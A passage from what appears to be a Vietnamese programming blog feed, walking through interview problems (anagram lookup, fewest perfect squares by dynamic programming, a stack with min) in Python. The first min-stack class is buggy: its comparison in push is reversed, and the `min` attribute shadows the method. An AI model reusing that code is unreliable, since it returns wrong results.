&lt;p&gt;Với mỗi từ &lt;strong&gt;X&lt;/strong&gt; trong từ điển, ta sẽ tìm ra bộ ký tự &lt;strong&gt;K&lt;/strong&gt; tương ứng của từ đó, và lưu &lt;strong&gt;X&lt;/strong&gt; vào danh sách các từ có bộ ký tự &lt;strong&gt;K&lt;/strong&gt;. Để trả lời câu hỏi, ta chỉ việc in ra danh sách các từ có bộ ký tự tương ứng với &lt;strong&gt;W&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Độ phức tạp thực thi của cách giải này là &lt;strong&gt;O(1)&lt;/strong&gt; với &lt;strong&gt;O(n)&lt;/strong&gt; bước xử lý trước (preprocessing), và tốn &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;collections&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_alphabet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="c1"&gt;# vì kiểu dict là khả biến, nên ta phải&lt;/span&gt;
    &lt;span class="c1"&gt;# chuyển &amp;quot;count&amp;quot; thành kiểu string để&lt;/span&gt;
    &lt;span class="c1"&gt;# có thể dùng làm khóa trong một dict khác&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()):&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%c%d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;get_alphabet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;aaabb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a3b2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;alpha_to_words&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;alpha&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_alphabet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;alpha_to_words&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;alpha&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;alpha_to_words&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;get_alphabet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mary&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;army&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;vithon&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mary&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mary&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;army&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cách giải trên sẽ áp dụng tốt nếu ta cần trả lời cho một loạt các từ &lt;strong&gt;W&lt;/strong&gt; bởi vì ta chỉ tốn thời gian xử lý trước một lần, và sau đó có thể truy vấn &lt;strong&gt;alpha_to_words&lt;/strong&gt; cho mỗi từ &lt;strong&gt;W&lt;/strong&gt; sau đó. Tuy nhiên, nếu ta chỉ cần trả lời câu hỏi cho duy nhất một từ &lt;strong&gt;W&lt;/strong&gt; thì việc tốn thêm &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ cho &lt;strong&gt;alpha_to_words&lt;/strong&gt; là không cần thiết. Trong trường hợp đó, ta chỉ việc xét từng từ trong &lt;strong&gt;D&lt;/strong&gt;, nếu nó có cùng bộ ký tự như &lt;strong&gt;W&lt;/strong&gt; thì ta xuất nó ra ngay.&lt;/p&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: Số lượng số chính phương ít nhất để có tổng là n</title><link href="/2015/03/phong-van-so-luong-so-chinh-phuong-it-nhat-de-co-tong-la-n.html" rel="alternate"></link><published>2015-03-14T15:53:00+07:00</published><updated>2015-03-14T15:53:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-14:/2015/03/phong-van-so-luong-so-chinh-phuong-it-nhat-de-co-tong-la-n.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một số nguyên dương &lt;strong&gt;n&lt;/strong&gt;, tìm số lượng số chính phương ít nhất có tổng là &lt;strong&gt;n&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ví dụ: Với n là 9, thì đáp án là 1 (vì 9 là số chính phương), với n là 10 thì đáp án là 2 (9 + 1), với n …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một số nguyên dương &lt;strong&gt;n&lt;/strong&gt;, tìm số lượng số chính phương ít nhất có tổng là &lt;strong&gt;n&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ví dụ: Với n là 9, thì đáp án là 1 (vì 9 là số chính phương), với n là 10 thì đáp án là 2 (9 + 1), với n là 11, đáp án là 3 (9 + 1 + 1), với n là 12 thì đáp án là 3 (4 + 4 + 4).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Giả sử như ta đã có đáp án cho tất cả các giá trị từ 1 đến &lt;strong&gt;n-1&lt;/strong&gt;, đáp án cho &lt;strong&gt;n&lt;/strong&gt; sẽ là &lt;strong&gt;min(1 + đáp án của (n-x))&lt;/strong&gt; với &lt;strong&gt;x&lt;/strong&gt; là một số chính phương. Nói một cách khác, với mỗi số chính phương &lt;strong&gt;x&lt;/strong&gt; nhỏ hơn hoặc bằng &lt;strong&gt;n&lt;/strong&gt;, số lượng số chính phương cần để có tổng là &lt;strong&gt;n&lt;/strong&gt; sẽ là số lượng số chính phương cần để tạo ra tổng là &lt;strong&gt;n-x&lt;/strong&gt; thêm &lt;strong&gt;1&lt;/strong&gt; (chính là x). Do đó, đáp án cho &lt;strong&gt;n&lt;/strong&gt; sẽ chính là min của các cách tạo ra tổng &lt;strong&gt;n&lt;/strong&gt; từ các số chính phương nhỏ hơn hoặc bằng &lt;strong&gt;n&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Như vậy, ta có thể giải bài toán này bằng cách điền vào bảng trả lời (đặt tên là &lt;strong&gt;ans&lt;/strong&gt;) cho các giá trị từ 0 đến &lt;strong&gt;n&lt;/strong&gt;. Kết quả cuối cùng sẽ là giá trị của &lt;strong&gt;ans[n]&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Cách giải các bài toán mà đáp án cho giá trị cuối cùng có thể được tính từ đáp án của các giá trị trước, và ta có thể tính các giá trị này bằng cách từ từ điền vào bảng, được gọi là &lt;strong&gt;quy hoạch động&lt;/strong&gt; (dynamic programming).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
            &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Độ phức tạp thực thi của cách giải này là &lt;strong&gt;O(n * sqrt(n))&lt;/strong&gt;, và tốn &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ.&lt;/p&gt;
&lt;/div&gt;
</content><category term="interview"></category><category term="dynamic programming"></category></entry><entry><title>Phỏng vấn: Cài đặt "ngăn xếp" với thao tác "min/max"</title><link href="/2015/03/phong-van-cai-dat-ngan-xep-voi-thao-tac-minmax.html" rel="alternate"></link><published>2015-03-11T03:07:00+07:00</published><updated>2015-03-11T03:07:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-11:/2015/03/phong-van-cai-dat-ngan-xep-voi-thao-tac-minmax.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cài đặt cấu trúc dữ liệu &lt;strong&gt;ngăn xếp&lt;/strong&gt; với thao tác &lt;strong&gt;trả về phần tử nhỏ (hay lớn) nhất&lt;/strong&gt; hiện tại của ngăn xếp.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Ngăn xếp (stack) là cấu trúc dữ liệu vào sau ra trước (Last In, First Out). Nói đến ngăn xếp ta phải …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cài đặt cấu trúc dữ liệu &lt;strong&gt;ngăn xếp&lt;/strong&gt; với thao tác &lt;strong&gt;trả về phần tử nhỏ (hay lớn) nhất&lt;/strong&gt; hiện tại của ngăn xếp.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Ngăn xếp (stack) là cấu trúc dữ liệu vào sau ra trước (Last In, First Out). Nói đến ngăn xếp ta phải nhớ ngay đến hai tác vụ quan trọng nhất là đẩy vào (&lt;strong&gt;push&lt;/strong&gt;) và lấy ra (&lt;strong&gt;pop&lt;/strong&gt;). Khi &lt;strong&gt;push&lt;/strong&gt; dữ liệu vào, dữ liệu sẽ nằm trên cùng của ngăn xếp (top of stack). Khi &lt;strong&gt;pop&lt;/strong&gt;, dữ liệu trên cùng của ngăn xếp sẽ được lấy ra khỏi ngăn xếp.&lt;/p&gt;
&lt;p&gt;Ngoài hai tác vụ trên, ta còn có thể kể thêm một số tác vụ truy vấn cấu trúc dữ liệu này ví dụ như số lượng dữ liệu có trong ngăn xếp, liệu ngăn xếp có dữ liệu hay không, hay xem dữ liệu trên cùng của ngăn xếp (mà không lấy nó ra khỏi ngăn xếp).&lt;/p&gt;
&lt;p&gt;Câu hỏi này yêu cầu ta cài đặt hai tác vụ &lt;strong&gt;push&lt;/strong&gt;, &lt;strong&gt;pop&lt;/strong&gt;, và thêm tác vụ &lt;strong&gt;min&lt;/strong&gt; (hoặc &lt;strong&gt;max&lt;/strong&gt;) để cho biết dữ liệu nhỏ nhất (hay lớn nhất) hiện tại trong ngăn xếp &lt;strong&gt;mà không lấy nó ra&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="section" id="cach-giai-de-nhat"&gt;
&lt;h3&gt;Cách giải dễ nhất&lt;/h3&gt;
&lt;p&gt;Điều đầu tiên ta nghĩ đến sẽ là tạo một biến để chứa giá trị cực tiểu (hay cực đại). Khi &lt;strong&gt;push&lt;/strong&gt; vào, ta sẽ cập nhật lại biến này nếu cần. Khi hỏi &lt;strong&gt;min&lt;/strong&gt; thì ta chỉ cần trả về giá trị này.&lt;/p&gt;
&lt;p&gt;Vấn đề phức tạp là khi &lt;strong&gt;pop&lt;/strong&gt; ra, làm sao để ta cập nhật lại biến cực tiểu đó? Một cách rất đơn giản là ta sẽ duyệt lại toàn bộ các dữ liệu đang có trong ngăn xếp để đưa ra giá trị cực tiểu mới.&lt;/p&gt;
&lt;p&gt;Cách giải này dẫn đến độ phức tạp &lt;strong&gt;O(1)&lt;/strong&gt; cho &lt;strong&gt;push&lt;/strong&gt;, &lt;strong&gt;O(1)&lt;/strong&gt; cho &lt;strong&gt;min&lt;/strong&gt; và &lt;strong&gt;O(n)&lt;/strong&gt; cho &lt;strong&gt;pop&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Stack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;del&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-giai-o-1-cho-pop"&gt;
&lt;h3&gt;Cách giải O(1) cho &lt;strong&gt;pop&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Ta nhận thấy rằng tác vụ &lt;strong&gt;pop&lt;/strong&gt; có độ phức tạp &lt;strong&gt;O(n)&lt;/strong&gt; là bởi vì ta phải duyệt lại toàn bộ các phần tử hiện tại của ngăn xếp để xác định phần tử cực tiểu.&lt;/p&gt;
&lt;p&gt;Một phương pháp thường được sử dụng để tăng tốc tác vụ là sử dụng bộ nhớ tạm (cache). Ta sẽ tráo đổi giữa thời gian chạy, và không gian nhớ. Nếu như ở mỗi lần &lt;strong&gt;push&lt;/strong&gt;, ta lưu giá trị cực tiểu của các phần tử trong ngăn xếp này vào trong một &lt;strong&gt;ngăn xếp thứ hai&lt;/strong&gt;, thì khi trả lời &lt;strong&gt;min&lt;/strong&gt;, ta chỉ việc nhìn vào (&lt;strong&gt;peek&lt;/strong&gt;) ngăn xếp thứ hai là sẽ có ngay kết quả. Và khi &lt;strong&gt;pop&lt;/strong&gt; thì ta chỉ việc &lt;strong&gt;pop&lt;/strong&gt; ở cả hai ngăn xếp. Các tác vụ này đều có độ phức tạp &lt;strong&gt;O(1)&lt;/strong&gt;, nhưng ta sẽ tốn thêm &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ cho ngăn xếp thứ hai.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;StackBase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

